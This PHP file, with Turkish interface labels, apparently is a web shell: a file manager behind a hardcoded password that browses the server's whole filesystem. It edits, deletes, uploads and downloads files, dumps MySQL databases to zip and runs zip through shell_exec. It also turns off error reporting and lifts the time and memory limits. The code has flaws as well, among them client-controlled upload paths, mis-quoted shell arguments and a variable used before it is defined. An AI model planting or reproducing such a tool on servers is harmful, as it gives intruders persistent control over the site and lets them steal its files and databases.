<?php
session_start();
$password = "hadex1979";
if(!isset($_SESSION['logged_in'])) {
    if(isset($_POST['login'])) {
        if($_POST['password'] == $password) {
            $_SESSION['logged_in'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
        } else {
            echo "<script>alert('Yanlış şifre!');</script>";
        }
    }
    
    echo '<style>
    body{background:#000;color:#0f0;font-family:monospace;}
    .login{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#111;padding:20px;border:1px solid #0f0;}
    input{background:#000;color:#0f0;border:1px solid #0f0;padding:5px;margin:5px 0;}
    .btn{background:#0f0;color:#000;border:0;padding:5px 10px;cursor:pointer;}
    </style>
    <div class="login">
    <h2>🔒 Giriş</h2>
    <form method="post">
    <input type="password" name="password" placeholder="Şifre" required><br>
    <input type="submit" name="login" value="Giriş" class="btn">
    </form>
    </div>';
    exit;
}

if(isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');

echo '<style>
body {
    background: #1a1a1a;
    color: #b8b8b8;
    font-family: "Segoe UI", Tahoma, sans-serif;
}
.container {
    margin: 20px;
}
table {
    width: 100%;
    border-collapse: collapse;
    margin: 20px 0;
    background: #222;
    border-radius: 4px;
    overflow: hidden;
}
th {
    background: #2c2c2c;
    cursor: pointer;
    transition: all 0.3s;
    color: #fff;
}
th:hover {
    background: #333;
}
th, td {
    border: 1px solid #333;
    padding: 10px;
    text-align: left;
}
tr:hover {
    background: #282828;
}
.btn {
    background: #444;
    color: #fff;
    border: 0;
    padding: 6px 12px;
    cursor: pointer;
    border-radius: 3px;
    transition: all 0.3s;
    font-size: 13px;
    margin: 2px;
}
.btn:hover {
    background: #555;
}
.btn-delete {
    background: #c41e3a;
}
.btn-delete:hover {
    background: #d63031;
}
.btn-primary {
    background: #2980b9;
}
.btn-primary:hover {
    background: #3498db;
}
.dir {
    color: #3498db;
    text-decoration: none;
    transition: all 0.3s;
}
.dir:hover {
    color: #2980b9;
}
.file {
    color: #b8b8b8;
}
.path {
    background: #222;
    padding: 15px;
    margin: 10px 0;
    border-radius: 4px;
    border-left: 4px solid #3498db;
}
.tabs {
    margin: 20px 0;
}
.tab {
    background: #222;
    color: #b8b8b8;
    border: 1px solid #333;
    padding: 10px 20px;
    cursor: pointer;
    text-decoration: none;
    border-radius: 4px;
    transition: all 0.3s;
}
.tab.active {
    background: #3498db;
    color: #fff;
    border-color: #3498db;
}
.tab:hover {
    background: #282828;
}
input, textarea {
    background: #222;
    color: #b8b8b8;
    border: 1px solid #333;
    padding: 8px;
    margin: 5px 0;
    border-radius: 3px;
}
.folder-row {
    background: #1f1f1f;
}
.search {
    width: 200px;
    float: right;
    margin: 10px 0;
}
.select-bar {
    background: #222;
    padding: 10px;
    margin: 10px 0;
    border-radius: 4px;
    display: flex;
    align-items: center;
    gap: 10px;
}
.checkbox-all {
    margin-right: 10px;
}
</style>';

// Yeni EKLENTİLER: Silme fonksiyonu (klasör/dosya)
function deleteDir($dir) {
    $items = scandir($dir);
    foreach($items as $item) {
        if($item == '.' || $item == '..') continue;
        $path = $dir.'/'.$item;
        if(is_dir($path)) {
            deleteDir($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($dir);
}

// Yeni EKLENTİLER: Dosya veya klasör taşıma işlemi
if(isset($_POST['move'])) {
    $source = realpath($current_dir.'/'.basename($_POST['source']));
    $destination_dir = rtrim($_POST['destination'], '/');
    $destination = $destination_dir.'/'.basename($_POST['source']);
    $destination = realpath($destination_dir) ? $destination : false;

    if(!$source || !$destination) {
        echo "<script>alert('Geçersiz kaynak veya hedef dizin!');</script>";
    } else {
        if(rename($source, $destination)) {
            echo "<script>alert('Taşıma başarılı!');window.location='?tab=files&dir=".urlencode($current_dir)."';</script>";
        } else {
            echo "<script>alert('Taşıma işlemi başarısız!');</script>";
        }
    }
}

if(isset($_GET['download'])) {
    $requestedFile = $_GET['download'];
    // Yol kodlamalarını temizle
    $requestedFile = str_replace(array('../', '..\\'), '', $requestedFile);
    
    // Mutlak yol oluştur
    $file = realpath($current_dir . DIRECTORY_SEPARATOR . $requestedFile);
    
    // Dosya gerçekten var mı ve current_dir içinde mi kontrol et
    if($file && is_file($file) && strpos($file, $current_dir) === 0) {
        // Dosya indirme başlıkları
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        flush();
        readfile($file);
        exit;
    } else {
        echo "<script>alert('Dosya bulunamadı veya erişim engellendi!');</script>";
    }
}


$tab = isset($_GET['tab']) ? $_GET['tab'] : 'files';
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath(dirname(__FILE__));
if(!$current_dir) $current_dir = realpath(dirname(__FILE__));
$sort = isset($_GET['sort']) ? $_GET['sort'] : 'name';
$order = isset($_GET['order']) ? $_GET['order'] : 'asc';

echo "<div class='container'>";
echo "<div style='position:fixed;top:10px;right:10px;z-index:1000;'>
<a href='?logout' class='btn btn-delete' onclick='return confirm(\"Çıkış yapılsın mı?\");'>Çıkış</a>
</div>";
echo "<h2>🔥 Süper Yönetici</h2>";

echo "<div class='tabs'>
<a href='?tab=files' class='tab ".($tab=='files'?'active':'')."'>Dosyalar</a>
<a href='?tab=database' class='tab ".($tab=='database'?'active':'')."'>Database</a>
<a href='?tab=upload&dir=".urlencode($current_dir)."' class='tab ".($tab=='upload'?'active':'')."'>Upload</a>
<a href='?tab=backup' class='tab ".($tab=='backup'?'active':'')."'>Yedek</a>
</div>";

if($tab == 'files') {
    // Path gösterimi
    $parts = explode(DIRECTORY_SEPARATOR, $current_dir);
    $path = '';
    echo "<div class='path'>Konum: ";
    foreach($parts as $part) {
        if($part) {
            $path .= DIRECTORY_SEPARATOR.$part;
            echo "<a href='?tab=files&dir=".urlencode($path)."' class='dir'>".htmlspecialchars($part)."</a>".DIRECTORY_SEPARATOR;
        }
    }
    echo "</div>";

    // Arama kutusu
    echo "<input type='text' id='searchInput' class='search' placeholder='Ara...' onkeyup='searchTable()'>";

    // Silme işlemi
    if(isset($_GET['delete'])) {
        $path_to_delete = realpath($current_dir.'/'.basename($_GET['delete']));
        if($path_to_delete && strpos($path_to_delete, $current_dir) === 0) {
            if(is_dir($path_to_delete)) {
                if(deleteDir($path_to_delete)) {
                    echo "<script>alert('Klasör silindi!');window.location='?tab=files&dir=".urlencode($current_dir)."';</script>";
                }
            } else {
                if(unlink($path_to_delete)) {
                    echo "<script>alert('Dosya silindi!');window.location='?tab=files&dir=".urlencode($current_dir)."';</script>";
                }
            }
        }
    }

    // Kaydetme işlemi
    if(isset($_POST['save'])) {
        $file = realpath($current_dir.'/'.basename($_POST['file']));
        if($file && strpos($file, $current_dir) === 0) {
            file_put_contents($file, $_POST['content']);
            echo "<script>alert('Kaydedildi!');window.location='?tab=files&dir=".urlencode($current_dir)."';</script>";
        }
    }

    // Yeniden adlandırma formu
    if(isset($_GET['rename'])) {
        $file = realpath($current_dir.'/'.basename($_GET['rename']));
        if($file && strpos($file, $current_dir) === 0) {
            echo "<form method='post'>
            <input type='hidden' name='oldname' value='".htmlspecialchars(basename($file))."'>
            <input type='text' name='newname' value='".htmlspecialchars(basename($file))."'>
            <input type='submit' name='do_rename' value='Yeniden Adlandır' class='btn'>
            <a href='?tab=files&dir=".urlencode($current_dir)."' class='btn'>İptal</a>
            </form>";
        }
    }

    // Yeniden adlandırma işlemi
    if(isset($_POST['do_rename'])) {
        $old = realpath($current_dir.'/'.basename($_POST['oldname']));
        $new = $current_dir.'/'.basename($_POST['newname']);
        if($old && strpos($old, $current_dir) === 0) {
            if(rename($old, $new)) {
                echo "<script>alert('Yeniden adlandırıldı!');window.location='?tab=files&dir=".urlencode($current_dir)."';</script>";
            }
        }
    }

    // Düzenleme formu
    if(isset($_GET['edit'])) {
        $file = realpath($current_dir.'/'.basename($_GET['edit']));
        if($file && strpos($file, $current_dir) === 0 && is_file($file)) {
            $content = htmlspecialchars(file_get_contents($file));
            echo "<form method='post'>
            <input type='hidden' name='file' value='".htmlspecialchars(basename($file))."'>
            <textarea name='content' style='width:100%;height:400px;'>$content</textarea><br>
            <input type='submit' name='save' value='Kaydet' class='btn'>
            <a href='?tab=files&dir=".urlencode($current_dir)."' class='btn'>Geri</a>
            </form>";
        }
    } else {
        // Dosya listesi
        echo "<table id='fileTable'>
        <tr>
            <th onclick='sortTable(0)'>İsim ▼</th>
            <th onclick='sortTable(1)'>Tip ▼</th>
            <th onclick='sortTable(2)'>Boyut ▼</th>
            <th onclick='sortTable(3)'>Tarih ▼</th>
            <th onclick='sortTable(4)'>İzin ▼</th>
            <th>İşlem</th>
        </tr>";

        // Üst dizin
        if($current_dir != DIRECTORY_SEPARATOR) {
            $up = dirname($current_dir);
            echo "<tr class='folder-row'>
            <td><a href='?tab=files&dir=".urlencode($up)."' class='dir'>📁 ..</a></td>
            <td>Dizin</td><td>-</td><td>-</td><td>-</td><td>-</td>
            </tr>";
        }

        // Önce klasörleri listele
        $items = scandir($current_dir);
        $folders = array();
        $files = array();

        foreach($items as $item) {
            if($item == '.' || $item == '..') continue;
            
            $path = $current_dir.'/'.$item;
            if(is_dir($path)) {
                $folders[] = $item;
            } else {
                $files[] = $item;
            }
        }

        // Klasörler
        foreach($folders as $folder) {
            $path = $current_dir.'/'.$folder;
            $time = date("Y-m-d H:i:s", filemtime($path));
            $perms = substr(sprintf('%o', fileperms($path)), -4);
            
            echo "<tr class='folder-row'>
            <td><a href='?tab=files&dir=".urlencode($path)."' class='dir'>📁 ".htmlspecialchars($folder)."</a></td>
            <td>Dizin</td>
            <td>-</td>
            <td>$time</td>
            <td>$perms</td>
            <td>
                <a href='?tab=files&dir=".urlencode($current_dir)."&rename=".urlencode($folder)."' class='btn'>Yeniden Adlandır</a>
                <a href='?tab=files&dir=".urlencode($current_dir)."&delete=".urlencode($folder)."' class='btn btn-delete' onclick='return confirm(\"Klasör silinsin mi?\");'>Sil</a>
                <form method='post' style='display:inline-block;margin-top:5px;'>
                    <input type='hidden' name='source' value='".htmlspecialchars($folder)."'>
                    <input type='text' name='destination' placeholder='Hedef dizin tam yol' required style='width:150px;'>
                    <input type='submit' name='move' value='Taşı' class='btn btn-primary'>
                </form>
            </td>
            </tr>";
        }

        // Dosyalar
        foreach($files as $file) {
            $path = $current_dir.'/'.$file;
            $size = round(filesize($path)/1024,2).' KB';
            $time = date("Y-m-d H:i:s", filemtime($path));
            $perms = substr(sprintf('%o', fileperms($path)), -4);
            
            echo "<tr>
            <td>📄 ".htmlspecialchars($file)."</td>
            <td>Dosya</td>
            <td>$size</td>
            <td>$time</td>
            <td>$perms</td>
            <td>
                <a href='?tab=files&dir=".urlencode($current_dir)."&edit=".urlencode($file)."' class='btn'>Düzenle</a>
                <a href='?tab=files&dir=".urlencode($current_dir)."&delete=".urlencode($file)."' class='btn btn-delete' onclick='return confirm(\"Dosya silinsin mi?\");'>Sil</a>
                <a href='?tab=files&dir=".urlencode($current_dir)."&download=".urlencode($file)."' class='btn'>İndir</a>
                <a href='?tab=files&dir=".urlencode($current_dir)."&rename=".urlencode($file)."' class='btn'>Yeniden Adlandır</a>
                <form method='post' style='display:inline-block;margin-top:5px;'>
                    <input type='hidden' name='source' value='".htmlspecialchars($file)."'>
                    <input type='text' name='destination' placeholder='Hedef dizin tam yol' required style='width:150px;'>
                    <input type='submit' name='move' value='Taşı' class='btn btn-primary'>
                </form>
            </td>
            </tr>";
        }
        echo "</table>";

        // Sıralama ve arama için JavaScript
        echo "<script>
        function sortTable(n) {
            var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
            table = document.getElementById('fileTable');
            switching = true;
            dir = 'asc';
            
            while (switching) {
                switching = false;
                rows = table.rows;
                
                for (i = 1; i < (rows.length - 1); i++) {
                    shouldSwitch = false;
                    x = rows[i].getElementsByTagName('TD')[n];
                    y = rows[i + 1].getElementsByTagName('TD')[n];
                    
                    if (dir == 'asc') {
                        if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
                            shouldSwitch = true;
                            break;
                        }
                    } else if (dir == 'desc') {
                        if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
                            shouldSwitch = true;
                            break;
                        }
                    }
                }
                
                if (shouldSwitch) {
                    rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
                    switching = true;
                    switchcount++;
                } else {
                    if (switchcount == 0 && dir == 'asc') {
                        dir = 'desc';
                        switching = true;
                    }
                }
            }
        }

        function searchTable() {
            var input, filter, table, tr, td, i, txtValue;
            input = document.getElementById('searchInput');
            filter = input.value.toLowerCase();
            table = document.getElementById('fileTable');
            tr = table.getElementsByTagName('tr');

            for (i = 0; i < tr.length; i++) {
                td = tr[i].getElementsByTagName('td')[0];
                if (td) {
                    txtValue = td.textContent || td.innerText;
                    if (txtValue.toLowerCase().indexOf(filter) > -1) {
                        tr[i].style.display = '';
                    } else {
                        tr[i].style.display = 'none';
                    }
                }
            }
        }
        </script>";
    }
}
elseif($tab == 'database') {
    if(!isset($_POST['export'])) {
        echo '<form method="post">
        <h3>🗄️ Database Export</h3>
        <table style="width:auto;">
        <tr><td>Host:</td><td><input type="text" name="host" value="localhost"></td></tr>
        <tr><td>DB:</td><td><input type="text" name="db"></td></tr>
        <tr><td>User:</td><td><input type="text" name="user"></td></tr>
        <tr><td>Pass:</td><td><input type="text" name="pass"></td></tr>
        </table>
        <input type="submit" name="export" value="Export" class="btn">
        </form>';
    } else {
        echo "<pre>";
        try {
            $conn = new mysqli($_POST['host'], $_POST['user'], $_POST['pass'], $_POST['db']);
            if($conn->connect_error) throw new Exception("Bağlantı hatası!");
            
            $filename = $_POST['db'].'_'.date('Y-m-d_H-i-s');
            $sql_file = $filename.'.sql';
            $zip_file = $filename.'.zip';
            
            $fp = fopen($sql_file, 'w');
            $tables = array();
            $result = $conn->query("SHOW TABLES");
            while($row = $result->fetch_array()) $tables[] = $row[0];
            
            foreach($tables as $table) {
                fwrite($fp, "-- Table: $table\n");
                fwrite($fp, "DROP TABLE IF EXISTS `$table`;\n");
                
                $result = $conn->query("SHOW CREATE TABLE `$table`");
                $row = $result->fetch_array();
                fwrite($fp, $row[1].";\n\n");
                
                $result = $conn->query("SELECT * FROM `$table`");
                while($row = $result->fetch_array(MYSQLI_ASSOC)) {
                    $values = array_map(array($conn, 'real_escape_string'), $row);
                    fwrite($fp, "INSERT INTO `$table` VALUES ('".implode("','", $values)."');\n");
                }
                fwrite($fp, "\n\n");
            }
            fclose($fp);
            
            shell_exec("zip $zip_file $sql_file");
            unlink($sql_file);
            
            if(file_exists($zip_file)) {
                $size = round(filesize($zip_file)/1024/1024, 2);
                echo "[✓] Export OK!\n";
                echo "[+] Zip: $zip_file ($size MB)\n";
                echo "[+] İndir: <a href='$zip_file' style='color:#0f0;'>$zip_file</a>\n";
            }
        } catch(Exception $e) {
            echo "[-] HATA: ".$e->getMessage()."\n";
        }
        echo "</pre>";
    }
}
elseif($tab == 'upload') {
    $upload_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $current_dir;
    if(!$upload_dir) $upload_dir = $current_dir;
    
    echo "<h3>📤 Dosya Upload</h3>";
    echo "<div class='path'>Upload Dizini: ".htmlspecialchars($upload_dir)."</div>";
    echo "<form method='post' enctype='multipart/form-data'>
    <input type='hidden' name='upload_dir' value='".htmlspecialchars($upload_dir)."'>
    <input type='file' name='file[]' multiple><br>
    <input type='submit' name='upload' value='Upload' class='btn'>
    <a href='?tab=files&dir=".urlencode($upload_dir)."' class='btn'>Geri Dön</a>
    </form>";

    if(isset($_POST['upload']) && isset($_FILES['file'])) {
        echo "<pre>";
        echo "[*] Upload başlıyor...\n\n";
        
        foreach($_FILES['file']['tmp_name'] as $key => $tmp_name) {
            if($_FILES['file']['error'][$key] == 0) {
                $target = rtrim($_POST['upload_dir'], '/') . '/' . basename($_FILES['file']['name'][$key]);
                echo "[*] Hedef: $target\n";
                
                $uploaded = false;
                
                // Metod 1: move_uploaded_file
                if(move_uploaded_file($tmp_name, $target)) {
                    $uploaded = true;
                }
                
                // Metod 2: copy
                if(!$uploaded && copy($tmp_name, $target)) {
                    $uploaded = true;
                }
                
                if($uploaded) {
                    echo "[✓] Başarılı: ".basename($target)."\n";
                } else {
                    echo "[-] Başarısız: ".basename($target)."\n";
                }
                echo "\n";
            }
        }
        
        echo "[+] Upload tamamlandı!\n";
        echo "[+] Dizin: ".htmlspecialchars($upload_dir)."\n";
        echo "[+] Link: <a href='?tab=files&dir=".urlencode($upload_dir)."' style='color:#0f0;'>Dosyalara Git</a>\n";
        echo "</pre>";
    }
}
elseif($tab == 'backup') {
    echo "<h3>💾 Dizin Yedekle</h3>";
    echo "<form method='post'>
    <table style='width:auto;'>
    <tr><td>Kaynak Dizin:</td><td><input type='text' name='src_dir' value='".htmlspecialchars($current_dir)."' size='50'></td></tr>
    <tr><td>Zip Adı:</td><td><input type='text' name='zip_name' value='backup_".date('Y-m-d_H-i-s').".zip' size='50'></td></tr>
    </table>
    <input type='submit' name='backup' value='Yedekle' class='btn'>
    </form>";

    if(isset($_POST['backup'])) {
        $src = rtrim($_POST['src_dir'], '/');
        $zip = $_POST['zip_name'];
        
        echo "<pre>";
        echo "[*] Yedekleniyor: $src\n";
        
        $cmd = "cd '".escapeshellarg(dirname($src))."' && zip -r '".escapeshellarg($zip)."' '".escapeshellarg(basename($src))."'";
        shell_exec($cmd);
        
        if(file_exists($zip)) {
            $size = round(filesize($zip)/1024/1024, 2);
            echo "[✓] Yedek OK!\n";
            echo "[+] Zip: $zip ($size MB)\n";
            echo "[+] İndir: <a href='$zip' style='color:#0f0;'>$zip</a>\n";
        } else {
            echo "[-] Yedekleme başarısız!\n";
        }
        echo "</pre>";
    }
}

echo "</div>";

// Javascript
echo "<script>
function sortTable(n) {
    var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
    table = document.getElementById('fileTable');
    switching = true;
    dir = 'asc';
    
    while (switching) {
        switching = false;
        rows = table.rows;
        
        for (i = 1; i < (rows.length - 1); i++) {
            shouldSwitch = false;
            x = rows[i].getElementsByTagName('TD')[n];
            y = rows[i + 1].getElementsByTagName('TD')[n];
            
            if (dir == 'asc') {
                if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
                    shouldSwitch = true;
                    break;
                }
            } else if (dir == 'desc') {
                if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
                    shouldSwitch = true;
                    break;
                }
            }
        }
        
        if (shouldSwitch) {
            rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
            switching = true;
            switchcount++;
        } else {
            if (switchcount == 0 && dir == 'asc') {
                dir = 'desc';
                switching = true;
            }
        }
    }
}

function searchTable() {
    var input, filter, table, tr, td, i, txtValue;
    input = document.getElementById('searchInput');
    filter = input.value.toLowerCase();
    table = document.getElementById('fileTable');
    tr = table.getElementsByTagName('tr');

    for (i = 0; i < tr.length; i++) {
        td = tr[i].getElementsByTagName('td')[0];
        if (td) {
            txtValue = td.textContent || td.innerText;
            if (txtValue.toLowerCase().indexOf(filter) > -1) {
                tr[i].style.display = '';
            } else {
                tr[i].style.display = 'none';
            }
        }
    }
}
</script>";
?>
